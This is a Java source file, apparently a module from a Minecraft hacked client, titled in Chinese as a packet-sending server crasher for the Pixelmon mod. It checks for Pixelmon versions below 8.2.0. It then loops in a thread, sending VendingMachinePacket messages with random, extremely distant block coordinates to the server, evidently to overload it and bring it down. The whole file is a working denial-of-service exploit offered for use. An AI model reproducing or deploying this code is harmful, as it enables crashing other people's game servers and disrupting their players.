package moe.badcat.module.modules;

import moe.badcat.module.BaseEnableModule;
import java.util.Random;
import net.minecraft.client.Minecraft;
import net.minecraft.network.NetworkManager;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.network.simpleimpl.IMessage;
import net.minecraftforge.fml.common.network.simpleimpl.SimpleNetworkWrapper;

public class ModulePixelmonCrash extends BaseEnableModule {
    private Random random = new Random();

    private SimpleNetworkWrapper networkWrapper;
    private Class<?> class_VendingMachinePacket;

    public ModulePixelmonCrash() {
        super("发包崩服", "宝可梦");
    }

    @Override
    public boolean initModule() {
        try {
            Class<?> class_Pixelmon = Class.forName("com.pixelmonmod.pixelmon.Pixelmon");

            try {
                String[] version = ((String) class_Pixelmon.getField("VERSION").get(null)).split("\\.");
                if (version.length == 3 && Integer.parseInt(version[0] + version[1] + version[2]) >= 820) return false;
            } catch (Exception ignored) {}

            networkWrapper = (SimpleNetworkWrapper) class_Pixelmon.getDeclaredField("network").get(null);
            if (networkWrapper == null) return false;

            class_VendingMachinePacket = Class.forName("com.pixelmonmod.pixelmon.comm.packetHandlers.vendingMachine.VendingMachinePacket");

            return true;
        } catch (Exception ignored) {}
        return false;
    }

    @Override
    public void onUse() {
        super.onUse();

        if (isEnable()) {
            startSendPacketThread();
        }
    }

    public void startSendPacketThread() {
        NetworkManager networkManager = Minecraft.getMinecraft().getConnection().getNetworkManager();
        new Thread(() -> {
            while (enable && networkManager.isChannelOpen()) {
                try {
                    IMessage vendingMachinePacket = (IMessage) class_VendingMachinePacket.getConstructor(BlockPos.class, String.class)
                            .newInstance(new BlockPos(random.nextInt(50000) << 9, 100, random.nextInt(50000) << 9), "");
                    networkWrapper.sendToServer(vendingMachinePacket);
                } catch (Exception e) {
                    if (ModuleDebug.enable) e.printStackTrace();
                    break;
                }
                try {
                    Thread.sleep(ModulePacketDelay.delay);
                } catch (InterruptedException ignored) {
                }
            }
            enable = false;
        }).start();
    }
}
